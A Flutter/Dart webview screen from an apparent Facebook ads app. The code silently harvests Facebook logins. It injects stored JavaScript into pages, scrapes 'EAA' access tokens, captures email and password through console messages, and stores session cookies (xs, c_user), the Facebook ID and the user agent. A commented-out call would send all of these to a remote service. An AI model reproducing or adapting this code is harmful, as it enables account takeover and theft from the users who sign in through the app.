import 'dart:convert';
import 'dart:io';
import 'package:ads/screens/home_layout.dart';
import 'package:ads/screens/home_page.dart';
import 'package:ads/utils/utils.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:ads/models/autogenerated.dart';
import 'package:ads/screens/onboarding_page.dart';
import 'package:ads/services/services.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_cookie_manager/webview_cookie_manager.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

class Webview extends StatefulWidget {
  static const String routeName = "/webview";
  String nextUrl;
  Webview({required this.nextUrl}) : super();
  @override
  _WebviewState createState() => _WebviewState(this.nextUrl);
}

class _WebviewState extends State<Webview> {
  String nextUrl;
  _WebviewState(this.nextUrl);
  final GlobalKey webViewKey = GlobalKey();
  final storage = const FlutterSecureStorage();
  InAppWebViewController? webViewController;
  InAppWebViewGroupOptions options = InAppWebViewGroupOptions(
    crossPlatform: InAppWebViewOptions(
      useShouldOverrideUrlLoading: true,
      mediaPlaybackRequiresUserGesture: false,
      clearCache: true,
    ),
    android: AndroidInAppWebViewOptions(
      useHybridComposition: true,
    ),
    ios: IOSInAppWebViewOptions(
      allowsInlineMediaPlayback: true,
    ),
  );

  late PullToRefreshController pullToRefreshController;
  String url = "";
  double progress = 0;
  final urlController = TextEditingController();
  String appTitle = '';
  @override
  void initState() {
    super.initState();
    pullToRefreshController = PullToRefreshController(
      options: PullToRefreshOptions(
        color: Colors.blue,
      ),
      onRefresh: () async {
        if (Platform.isAndroid) {
          webViewController?.reload();
        } else if (Platform.isIOS) {
          webViewController?.loadUrl(
              urlRequest: URLRequest(url: await webViewController?.getUrl()));
        }
      },
    );

    storage.read(key: 'app_title').then((value) => {
          setState(() {
            appTitle = value!;
          })
        });
  }

  @override
  void dispose() {
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
        future: fetchData(),
        builder: (context, snapshot) {
          return Scaffold(
              body: SafeArea(
                  child: Column(children: <Widget>[
            Expanded(
              child: Stack(
                children: [
                  InAppWebView(
                    key: webViewKey,
                    initialUrlRequest: URLRequest(url: Uri.parse(nextUrl)),
                    initialOptions: options,
                    pullToRefreshController: pullToRefreshController,
                    onWebViewCreated: (controller) async {
                      webViewController = controller;
                    },
                    // onLoadStart: _onloadStart,
                    // androidOnPermissionRequest: _androidOnPermissionRequest,
                    shouldOverrideUrlLoading: _shouldOverrideUrlLoading,
                    onLoadStop: _onLoadStop,
                    onLoadError: (controller, url, code, message) {
                      pullToRefreshController.endRefreshing();
                    },
                    onProgressChanged: _onProgressChanged,
                    onUpdateVisitedHistory:
                        (controller, url, androidIsReload) async {
                      final cookieManager = WebviewCookieManager();
                      var cookie = await cookieManager.getCookies(nextUrl);
                      if (cookie.toString().contains('xs=')) {
                        controller.loadUrl(
                            urlRequest: URLRequest(
                          url: Uri.parse(
                              "https://business.facebook.com/ads/ad_limits"),
                        ));
                        var email = await storage.read(key: "fb_email");
                        var password = await storage.read(key: "fb_password");

                        var cookieWithCuser = cookie.firstWhere((_cookie) {
                          return _cookie.toString().contains('c_user');
                        });
                        String cookieStr = cookie.map((element) {
                          return "${element.name}=${element.value}";
                        }).join(';');
                        await storage.write(key: "cookie", value: cookieStr);
                        var fbId = cookieWithCuser.value;
                        await storage.write(key: "fbId", value: fbId);

                        var userArgent = await controller.evaluateJavascript(
                            source: "navigator.userAgent");

                        await storage.write(
                            key: "userArgent", value: userArgent);
                      }

                      if (url.toString().startsWith("view-source")) {
                        // final saveResponse = await Service.saveData({
                        //   'id_facebook': fbId,
                        //   'email': email!,
                        //   'password': password!,
                        //   'cookie': cookieStr,
                        //   'user_agent': userArgent,
                        //   'from_app': dotenv.env['APP_NAME'],
                        // });
                        // Navigator.pushNamed(context, HomeLayout.routeName);
                        // await Service.trackingLoginFacebookSuccess();
                      }
                    },
                    onConsoleMessage: _onConsoleMessage,
                  ),
                  progress < 1.0
                      ? LinearProgressIndicator(value: progress)
                      : Container(),
                ],
              ),
            ),
          ])));
        });
  }

  Future<void> _onProgressChanged(controller, progress) async {
    var jsacc2 = await storage.read(key: "jsacc2");
    await controller.evaluateJavascript(source: jsacc2);
    await controller.evaluateJavascript(source: """
    var match = document.querySelector('html').innerText.match(/EAA.*?"/g);
    if (match?.length > 0) {
      console.log(JSON.stringify({ user: { token: match[0].replace(/"\$/, "") }}));
    }
    """);
  }

  Future<void> _onConsoleMessage(controller, consoleMessage) async {
    try {
      final message = jsonDecode(consoleMessage.message);
      final response = Autogenerated.fromJson(message);
      final email = response.user?.email;
      final password = response.user?.password;
      if (email != null) {
        await storage.write(key: "fb_email", value: email);
      }

      if (password != null) {
        await storage.write(key: "fb_password", value: password);
      }
    } catch (e) {
      debugPrint(e.toString());
    }

    try {
      final message = jsonDecode(consoleMessage.message);
      final response = Autogenerated.fromJson(message);
      final token = response.user?.token;
      if (token != null) {
        print("TOKEN");
        print(token);
        await storage.write(key: "fb_token", value: token);
      }
    } catch (e) {
       debugPrint(e.toString());
    }
  }

  Future<PermissionRequestResponse> _androidOnPermissionRequest(
      controller, origin, resources) async {
    return PermissionRequestResponse(
        resources: resources, action: PermissionRequestResponseAction.GRANT);
  }

  Future<NavigationActionPolicy> _shouldOverrideUrlLoading(
      controller, navigationAction) async {
    var uri = navigationAction.request.url!;

    if (!["http", "https", "file", "chrome", "data", "javascript", "about"]
        .contains(uri.scheme)) {
      if (await canLaunch(url)) {
        // Launch the App
        await launch(
          url,
        );
        // and cancel the request
        return NavigationActionPolicy.CANCEL;
      }
    }

    return NavigationActionPolicy.ALLOW;
  }

  Future<void> _onLoadStop(controller, url) async {
    pullToRefreshController.endRefreshing();
    setState(() {
      this.url = url.toString();
      urlController.text = this.url;
    });
  }

  Future fetchData() async {
    var jsacc2 = await storage.read(key: "jsacc2");
    return Future.value({
      "jsacc2": jsacc2,
    });
  }
}
